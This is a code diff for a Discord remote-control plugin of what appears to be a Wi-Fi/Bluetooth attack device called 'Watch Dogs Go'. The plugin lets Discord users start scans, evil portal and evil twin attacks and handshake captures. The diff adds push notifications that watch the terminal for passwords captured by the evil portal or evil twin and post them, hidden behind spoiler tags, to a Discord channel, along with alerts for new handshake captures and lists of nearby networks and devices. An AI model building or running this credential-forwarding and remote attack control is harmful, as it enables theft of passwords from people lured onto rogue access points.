@@ -19,6 +19,10 @@ Commands use a message prefix in the configured channel:
     !wdg sdr stop
     !wdg stop
     !wdg disable
+
+Push notifications (opt-in, set DISCORD_PUSH_EVENTS=1 in secrets.conf):
+    Sends a grouped summary to the channel after each WiFi/BT scan round,
+    and an immediate alert for each handshake capture.
 """
 
 from __future__ import annotations
@@ -127,6 +131,14 @@ class DiscordRemote(PluginBase):
         self._allowed_users: set[int] = set()
         self._loop = None
         self._client = None
+        # push-notification state
+        self._push_events = False
+        self._push_wifi_seen: set[str] = set()
+        self._push_bt_seen: set[str] = set()
+        self._push_last_wifi_scan_done = 0.0
+        self._push_last_bt_scan_done = 0.0
+        self._push_last_hs_count = -1
+        self._push_last_terminal_idx = -1  # -1 = unset; baseline on first check
         self._load_config()
 
     def menu_items(self) -> list[PluginMenuItem]:
@@ -156,6 +168,7 @@ class DiscordRemote(PluginBase):
 
     def on_update(self) -> None:
         self._drain_requests()
+        self._check_push_events()
         if not self._overlay_active:
             return
         import pyxel
@@ -205,7 +218,8 @@ class DiscordRemote(PluginBase):
             pyxel.text(248, ly, text[:52], c)
             ly += 8
 
-        pyxel.text(8, h - 34, f"Channel: {self._channel_id or 'not set'}", 13)
+        push_str = "push:ON" if self._push_events else "push:off"
+        pyxel.text(8, h - 34, f"Channel: {self._channel_id or 'not set'}  {push_str}", 13)
         pyxel.text(8, h - 24, f"Allowed users: {len(self._allowed_users)}", 13)
         pyxel.text(8, h - 12, "[ENTER] Execute  [ESC] Back", 13)
 
@@ -228,6 +242,7 @@ class DiscordRemote(PluginBase):
         except ValueError:
             self._channel_id = 0
         self._allowed_users = _parse_ids(conf.get("DISCORD_ALLOWED_USERS", ""))
+        self._push_events = conf.get("DISCORD_PUSH_EVENTS", "").lower() in ("1", "true", "yes")
 
     def _configured(self) -> bool:
         return bool(self._token and self._channel_id and self._allowed_users)
@@ -241,6 +256,12 @@ class DiscordRemote(PluginBase):
             return
         self._want_running = True
         self._starting = True
+        self._push_wifi_seen.clear()
+        self._push_bt_seen.clear()
+        self._push_last_wifi_scan_done = 0.0
+        self._push_last_bt_scan_done = 0.0
+        self._push_last_hs_count = -1
+        self._push_last_terminal_idx = -1
         self._thread = threading.Thread(
             target=self._discord_worker,
             name="discord-remote",
@@ -358,6 +379,122 @@ class DiscordRemote(PluginBase):
 
         self._starting = False
 
+    def _push(self, text: str) -> None:
+        """Send a proactive (unsolicited) message to the Discord channel."""
+        loop = self._loop
+        client = self._client
+        if not (self._enabled and loop and client):
+            return
+        channel = client.get_channel(self._channel_id)
+        if channel is None:
+            return
+        try:
+            asyncio.run_coroutine_threadsafe(
+                channel.send(text[:MAX_REPLY] or "…"), loop)
+        except Exception:
+            pass
+
+    def _push_chunked(self, header: str, rows: list[str]) -> None:
+        """Send header + rows as one or more messages, each ≤ MAX_REPLY chars."""
+        fence = "```"
+        # overhead per chunk: header\n```\n<rows>\n```
+        OVERHEAD = len(fence) * 2 + 4  # two fences + newlines
+        CONT_HEADER = "*(cont.)*"
+        chunks: list[list[str]] = [[]]
+        budget = MAX_REPLY - OVERHEAD - len(header)
+
+        for row in rows:
+            needed = len(row) + 1  # +1 for newline
+            if budget - needed < 0 and chunks[-1]:
+                chunks.append([])
+                budget = MAX_REPLY - OVERHEAD - len(CONT_HEADER)
+            chunks[-1].append(row)
+            budget -= needed
+
+        for i, chunk in enumerate(chunks):
+            h = header if i == 0 else CONT_HEADER
+            self._push(f"{h}\n{fence}\n" + "\n".join(chunk) + f"\n{fence}")
+
+    def _push_credential(self, tag: str, data: str) -> None:
+        label = "Evil Portal" if tag == "EP" else "Evil Twin"
+        self._push(f"**[{label}] Credential captured**\n||{data[:400]}||")
+        self._log_add(f"Pushed {tag} credential to Discord", 11)
+
+    def _check_push_events(self) -> None:
+        if not (self._push_events and self._enabled):
+            return
+        app = self.app
+        if not app:
+            return
+
+        wt = getattr(app, "_wifi_scan_done_time", 0.0)
+        if wt > 0 and wt != self._push_last_wifi_scan_done:
+            self._push_last_wifi_scan_done = wt
+            self._push_wifi_batch()
+
+        bt = getattr(app, "_bt_scan_done_time", 0.0)
+        if bt > 0 and bt != self._push_last_bt_scan_done:
+            self._push_last_bt_scan_done = bt
+            self._push_bt_batch()
+
+        hs = getattr(app, "_last_hs_count", 0)
+        if self._push_last_hs_count < 0:
+            self._push_last_hs_count = hs
+        elif hs > self._push_last_hs_count:
+            delta = hs - self._push_last_hs_count
+            self._push_last_hs_count = hs
+            noun = "handshake" if delta == 1 else "handshakes"
+            self._push(f"**Handshake captured!** ({delta} new {noun})")
+
+        # Credential lines from terminal — baseline on first check so we
+        # don't re-push events that happened before this session connected.
+        try:
+            with app._term_lock:
+                term = list(app.terminal_lines)
+        except Exception:
+            term = []
+        if self._push_last_terminal_idx < 0:
+            self._push_last_terminal_idx = len(term)
+        else:
+            new_lines = term[self._push_last_terminal_idx:]
+            self._push_last_terminal_idx = len(term)
+            for line in new_lines:
+                if "[EP:PWD]" in line:
+                    data = line.split("[EP:PWD]", 1)[-1].strip()
+                    self._push_credential("EP", data)
+                elif "[ET:PWD]" in line:
+                    data = line.split("[ET:PWD]", 1)[-1].strip()
+                    self._push_credential("ET", data)
+
+    def _push_wifi_batch(self) -> None:
+        app = self.app
+        if not app:
+            return
+        nets = [n for n in app.wifi_networks if n.bssid not in self._push_wifi_seen]
+        if not nets:
+            return
+        for n in nets:
+            self._push_wifi_seen.add(n.bssid)
+        noun = "network" if len(nets) == 1 else "networks"
+        header = f"**[WiFi]** {len(nets)} new {noun}"
+        rows = [f"  {(n.ssid or '<hidden>'):<18} Ch:{n.channel:<3} {n.rssi}dBm"
+                for n in nets]
+        self._push_chunked(header, rows)
+
+    def _push_bt_batch(self) -> None:
+        app = self.app
+        if not app:
+            return
+        devs = [d for d in app.ble_devices if d.mac not in self._push_bt_seen]
+        if not devs:
+            return
+        for d in devs:
+            self._push_bt_seen.add(d.mac)
+        noun = "device" if len(devs) == 1 else "devices"
+        header = f"**[BT]** {len(devs)} new {noun}"
+        rows = [f"  {d.name:<18} {d.rssi}dBm" for d in devs]
+        self._push_chunked(header, rows)
+
     def _drain_requests(self) -> None:
         for _ in range(8):
             try:
@@ -387,12 +524,14 @@ class DiscordRemote(PluginBase):
             return self._sdr(target)
         if head == "menu":
             return self._menu_cmd(parts[1:])
+        if head == "sys":
+            return self._sys_text()
         if head == "stop":
             return self._stop_all()
         if head == "disable":
             self._disable()
-            return "Discord remote disabled. Re-enable locally from PLUGINS."
-        return f"Unknown command: {command}\n\n{self._help_text()}"
+            return "📴 Discord remote disabled — re-enable locally from **PLUGINS**."
+        return f"⚠️ Unknown command: `{command}`\n\n{self._help_text()}"
 
     def _status_text(self) -> str:
         app = self.app
@@ -411,14 +550,107 @@ class DiscordRemote(PluginBase):
             ops.append("evil portal")
         if getattr(app.state, "evil_twin_running", False):
             ops.append("evil twin")
-        gps = "fix" if getattr(app, "gps_fix", False) else "no fix"
+        esp_on = getattr(app, "_esp32", False)
+        gps_fix = getattr(app, "gps_fix", False)
         return "\n".join([
-            "Watch Dogs Go status",
-            f"ESP32: {'connected' if getattr(app, '_esp32', False) else 'offline'}",
-            f"GPS: {gps} sats:{getattr(app, 'gps_sats', 0)}",
-            f"Level: {getattr(app, 'level', '?')} {getattr(app, 'level_title', '')}",
-            f"Running: {', '.join(ops) if ops else 'idle'}",
+            "## Watch Dogs Go",
+            f"{'🟢' if esp_on else '🔴'} **ESP32:** {'connected' if esp_on else 'offline'}",
+            f"**GPS:** {'fix' if gps_fix else 'no fix'}  `{getattr(app, 'gps_sats', 0)} sats`",
+            f"**Level:** {getattr(app, 'level', '?')} — {getattr(app, 'level_title', '')}",
+            f"**Running:** {', '.join(ops) if ops else 'idle'}",
         ])
+
+    def _sys_text(self) -> str:
+        import os
+        import subprocess
+
+        lines = []
+
+        # Uptime
+        try:
+            with open("/proc/uptime") as f:
+                secs = int(float(f.read().split()[0]))
+            h, rem = divmod(secs, 3600)
+            m = rem // 60
+            lines.append(f"Uptime  : {h}h {m}m")
+        except Exception:
+            pass
+
+        # CPU load (no blocking sleep — use kernel averages)
+        try:
+            with open("/proc/loadavg") as f:
+                l1, l5, l15 = f.read().split()[:3]
+            lines.append(f"Load    : {l1} {l5} {l15}  (1/5/15m)")
+        except Exception:
+            pass
+
+        # CPU temperature
+        try:
+            with open("/sys/class/thermal/thermal_zone0/temp") as f:
+                temp = int(f.read().strip()) / 1000
+            lines.append(f"CPU temp: {temp:.1f}°C")
+        except Exception:
+            pass
+
+        # RAM
+        try:
+            mem = {}
+            with open("/proc/meminfo") as f:
+                for line in f:
+                    k, v = line.split(":", 1)
+                    mem[k.strip()] = int(v.strip().split()[0])
+            total = mem["MemTotal"] / 1024 / 1024
+            avail = mem["MemAvailable"] / 1024 / 1024
+            used = total - avail
+            lines.append(f"RAM     : {used:.1f} / {total:.1f} GB")
+        except Exception:
+            pass
+
+        # Disk (root partition)
+        try:
+            st = os.statvfs("/")
+            total = st.f_blocks * st.f_frsize / 1024 ** 3
+            free = st.f_bavail * st.f_frsize / 1024 ** 3
+            lines.append(f"Disk    : {free:.1f} / {total:.1f} GB free")
+        except Exception:
+            pass
+
+        # Battery
+        try:
+            bat_root = Path("/sys/class/power_supply")
+            for entry in sorted(bat_root.iterdir()):
+                cap_f = entry / "capacity"
+                if cap_f.exists():
+                    cap = cap_f.read_text().strip()
+                    status_f = entry / "status"
+                    status = status_f.read_text().strip().lower() if status_f.exists() else "?"
+                    lines.append(f"Battery : {cap}%  ({status})")
+                    break
+        except Exception:
+            pass
+
+        # IP addresses
+        try:
+            out = subprocess.run(
+                ["ip", "-4", "addr", "show"],
+                capture_output=True, text=True, timeout=3,
+            ).stdout
+            iface = None
+            addrs = []
+            for line in out.splitlines():
+                if line and not line[0].isspace():
+                    iface = line.split(":")[1].strip().split("@")[0]
+                elif "inet " in line and iface and iface != "lo":
+                    ip = line.strip().split()[1].split("/")[0]
+                    addrs.append(f"{iface} {ip}")
+            if addrs:
+                lines.append(f"IP      : {', '.join(addrs)}")
+        except Exception:
+            pass
+
+        if not lines:
+            return "⚠️ System info unavailable"
+        return "## System\n```\n" + "\n".join(lines) + "\n```"
 
     def _loot_text(self) -> str:
         app = self.app
@@ -431,13 +663,13 @@ class DiscordRemote(PluginBase):
         t = getattr(app, "_loot_totals", {})
         passwords = t.get("passwords", 0) + t.get("et_captures", 0)
         return "\n".join([
-            "Loot totals",
-            f"Sessions: {t.get('sessions', 0)}",
-            f"WiFi nets: {t.get('wifi', 0)}",
-            f"BT devices: {t.get('bt', 0)}",
-            f"Handshakes: {t.get('pcap', 0)}",
-            f"HC22000: {t.get('hs', 0)}",
-            f"Credential captures: {passwords}",
+            "## Loot",
+            f"**Sessions:** {t.get('sessions', 0)}",
+            f"**WiFi nets:** {t.get('wifi', 0)}",
+            f"**BT devices:** {t.get('bt', 0)}",
+            f"**Handshakes:** {t.get('pcap', 0)}",
+            f"**HC22000:** {t.get('hs', 0)}",
+            f"**Credentials:** {passwords}",
         ])
 
     def _tail_text(self) -> str:
@@ -456,59 +688,60 @@ class DiscordRemote(PluginBase):
             lines = [mask_line(line) for line in lines]
         except Exception:
             pass
-        return "Recent terminal lines:\n" + "\n".join(lines)[-MAX_REPLY:]
+        body = "\n".join(lines)[-MAX_REPLY:]
+        return f"## Terminal\n```\n{body}\n```"
 
     def _scan(self, target: str) -> str:
         app = self.app
         if not app:
             return "App not ready"
         if app._anything_running_on_esp():
-            return "Refusing to start scan while another ESP32 operation is running"
+            return "⚠️ Refusing to start scan — another ESP32 operation is running"
         if target == "wifi":
             app._start_scan_cmd("scan_networks", "wifi_scan", "Remote WiFi Scan")
-            return "Started WiFi scan"
+            return "WiFi scan started"
         if target in ("bt", "ble"):
             app._start_scan_cmd("scan_bt", "ble_scan", "Remote BT Scan")
-            return "Started BT scan"
-        return "Usage: !wdg scan wifi | !wdg scan bt"
+            return "BT scan started"
+        return "⚠️ Usage: `!wdg scan wifi` | `!wdg scan bt`"
 
     def _sdr(self, target: str) -> str:
         app = self.app
         if not app:
             return "App not ready"
         if not getattr(app, "_sdr_enabled", False):
-            return "SDR is off. Enable it locally first: SYSTEM > SDR"
+            return "⚠️ SDR is off — enable locally first: **SYSTEM > SDR**"
         if target == "status":
             if not app._sdr.running:
-                return "SDR is enabled; no receiver is running"
-            parts = [f"SDR mode: {app._sdr.mode}"]
+                return "SDR enabled — no receiver running"
+            parts = [f"**SDR mode:** `{app._sdr.mode}`"]
             if "adsb" in app._sdr.mode:
                 n_pos = sum(1 for a in app._sdr.aircraft.values()
                             if a.has_position)
                 parts.append(
-                    f"ADS-B aircraft: {n_pos}/{len(app._sdr.aircraft)} positioned")
+                    f"**ADS-B:** {n_pos}/{len(app._sdr.aircraft)} positioned")
             if "433" in app._sdr.mode:
                 parts.append(
-                    f"433 MHz sensors: {app._sdr.total_sensors_seen}")
+                    f"**433 MHz:** {app._sdr.total_sensors_seen} sensors seen")
             return "\n".join(parts)
         if target in ("adsb", "ads-b"):
             if app._sdr.running and "adsb" in app._sdr.mode:
                 return "ADS-B is already running"
             app._sdr_adsb()
-            return "Started ADS-B receiver"
+            return "ADS-B receiver started"
         if target in ("433", "433mhz"):
             if app._sdr.running and "433" in app._sdr.mode:
                 return "433 MHz scanner is already running"
             app._sdr_433()
-            return "Started 433 MHz scanner"
+            return "433 MHz scanner started"
         if target == "stop":
             if not app._sdr.running:
-                return "No SDR receiver is running"
+                return "⚠️ No SDR receiver is running"
             app._sdr.stop()
             app.msg("[Discord] SDR stop", 10)
             app._term_add("[SDR] Remote stop", raw=True)
-            return "Stopped SDR receivers"
-        return "Usage: !wdg sdr status | !wdg sdr adsb | !wdg sdr 433 | !wdg sdr stop"
+            return "⛔ SDR receivers stopped"
+        return "⚠️ Usage: `!wdg sdr status` | `!wdg sdr adsb` | `!wdg sdr 433` | `!wdg sdr stop`"
 
     def _stop_all(self) -> str:
         app = self.app
@@ -525,9 +758,9 @@ class DiscordRemote(PluginBase):
             app.state.portal_running = False
             app.state.evil_twin_running = False
             app.msg("[Discord] Remote stop", 10)
-            return "Stop sent"
+            return "⛔ All operations stopped"
         except Exception as exc:
-            return f"Stop failed: {exc}"
+            return f"🔴 Stop failed: {exc}"
 
     # ------------------------------------------------------------------
     # Game menu navigation
@@ -538,10 +771,10 @@ class DiscordRemote(PluginBase):
         MENU_CATS = _get_menu_cats()
 
         if not parts:
-            lines = ["**Watch Dogs Go — Remote Menu**", "```"]
+            lines = ["## Watch Dogs Go — Remote Menu", "```"]
             for i, (cat_name, items) in enumerate(MENU_CATS, 1):
                 n = sum(1 for it in items if it[2] not in _MENU_REMOTE_SKIP)
-                lines.append(f"  {i}.  {cat_name:<10}{n} items")
+                lines.append(f"  {i}.  {cat_name:<12}{n} items")
             lines.append("```")
             lines.append("`!wdg menu <cat>` — list  ·  `!wdg menu <cat> <n>` — run")
             return "\n".join(lines)
@@ -562,14 +795,14 @@ class DiscordRemote(PluginBase):
                 pass
         if cat_idx is None:
             names = ", ".join(c for c, _ in MENU_CATS)
-            return f"Unknown category '{parts[0]}'. Available: {names}"
+            return f"⚠️ Unknown category `{parts[0]}`. Available: {names}"
 
         cat_name, items = MENU_CATS[cat_idx]
         visible = [it for it in items if it[2] not in _MENU_REMOTE_SKIP]
 
         if len(parts) == 1:
             app = self.app
-            lines = [f"**── {cat_name} ──**", "```"]
+            lines = [f"## {cat_name}", "```"]
             for i, (_hk, name, _cmd, state_key, input_type) in enumerate(visible, 1):
                 running = app._is_running(state_key) if app else False
                 status = " ●" if running else ""
@@ -600,15 +833,15 @@ class DiscordRemote(PluginBase):
         # Items requiring input args
         if input_type and not extra:
             if input_type == "bssid_ch":
-                return (f"{name}: requires BSSID and channel\n"
-                        f"  !wdg menu {cat.lower()} <n> AA:BB:CC:DD:EE:FF 6")
+                return (f"⚠️ **{name}** requires BSSID and channel\n"
+                        f"`!wdg menu {cat.lower()} <n> AA:BB:CC:DD:EE:FF 6`")
             if input_type == "mac":
-                return (f"{name}: requires MAC address\n"
-                        f"  !wdg menu {cat.lower()} <n> AA:BB:CC:DD:EE:FF")
+                return (f"⚠️ **{name}** requires MAC address\n"
+                        f"`!wdg menu {cat.lower()} <n> AA:BB:CC:DD:EE:FF`")
             if input_type == "ssid":
-                return (f"{name}: requires SSID\n"
-                        f"  !wdg menu {cat.lower()} <n> <ssid>")
-            return f"{name}: requires input — !wdg menu {cat.lower()} <n> <value>"
+                return (f"⚠️ **{name}** requires SSID\n"
+                        f"`!wdg menu {cat.lower()} <n> <ssid>`")
+            return f"⚠️ **{name}** requires input — `!wdg menu {cat.lower()} <n> <value>`"
 
         # Build field_values from extra args
         field_values: list[str] = []
@@ -670,11 +903,12 @@ class DiscordRemote(PluginBase):
         # Evil Portal: send SSID directly
         if cmd == "_evil_portal":
             if not extra:
-                return "Evil Portal: provide SSID — !wdg menu attack 7 <ssid>"
+                return (f"⚠️ **Evil Portal** requires an SSID\n"
+                        f"`!wdg menu attack 7 <ssid>`")
             ssid = " ".join(extra)
             if not app._esp32:
                 if not app._try_reconnect_esp32():
-                    return "No ESP32 connected"
+                    return "⚠️ No ESP32 connected"
             app._portal_ssid = ssid
             app._attack_mode = "evil_portal"
             app._send(f"start_portal {ssid}")
@@ -682,44 +916,49 @@ class DiscordRemote(PluginBase):
             app.state.portal_ssid = ssid
             app._attack_step = "running"
             app.msg(f"[Discord] Evil Portal: {ssid}", 10)
-            return f"Evil Portal started — SSID: {ssid}"
+            return f"**Evil Portal** started — SSID: `{ssid}`"
 
         # Pure ESP32 commands (no leading underscore)
         if not cmd.startswith("_"):
             if app._anything_running_on_esp():
-                return f"Refusing to start '{name}' while another ESP32 operation is running"
+                return f"⚠️ Refusing to start **{name}** — another ESP32 operation is running"
             if not app._esp32:
                 if not app._try_reconnect_esp32():
-                    return "No ESP32 connected"
+                    return "⚠️ No ESP32 connected"
             running = app._is_running(state_key)
             if running:
                 app._send("stop")
                 app._set_running(state_key, False)
-                return f"Stopped: {name}"
+                return f"⛔ Stopped: **{name}**"
             final_cmd = (cmd + " " + " ".join(v for v in field_values if v)
                          if field_values else cmd)
             app._start_scan_cmd(final_cmd, state_key, name)
-            return f"Started: {name}"
+            return f"Started: **{name}**"
 
-        return f"'{name}' cannot be triggered remotely"
+        return f"⚠️ `{name}` cannot be triggered remotely"
 
     def _help_text(self) -> str:
+        push_note = ("Push events: **ON** — WiFi/BT batches · HS alerts · credential captures"
+                     if self._push_events
+                     else "Push events: **off** *(set `DISCORD_PUSH_EVENTS=1` in secrets.conf to enable)*")
         return "\n".join([
-            "Commands:",
-            "!wdg status",
-            "!wdg loot",
-            "!wdg tail",
-            "!wdg menu                   — list menu categories",
-            "!wdg menu <cat>             — list items in category",
-            "!wdg menu <cat> <n> [args]  — run menu item",
-            "!wdg scan wifi",
-            "!wdg scan bt",
-            "!wdg sdr status",
-            "!wdg sdr adsb",
-            "!wdg sdr 433",
-            "!wdg sdr stop",
-            "!wdg stop",
-            "!wdg disable",
+            "## Watch Dogs Go Remote",
+            "**Info**",
+            "`!wdg status`  `!wdg sys`  `!wdg loot`  `!wdg tail`",
+            "",
+            "**Scanning**",
+            "`!wdg scan wifi`  `!wdg scan bt`",
+            "",
+            "**SDR**",
+            "`!wdg sdr status`  `!wdg sdr adsb`  `!wdg sdr 433`  `!wdg sdr stop`",
+            "",
+            "**Menu**",
+            "`!wdg menu`  `!wdg menu <cat>`  `!wdg menu <cat> <n> [args]`",
+            "",
+            "**Control**",
+            "`!wdg stop`  `!wdg disable`",
+            "",
+            push_note,
         ])
 
     def _audit(self, user_id: int, command: str, result: str) -> None:
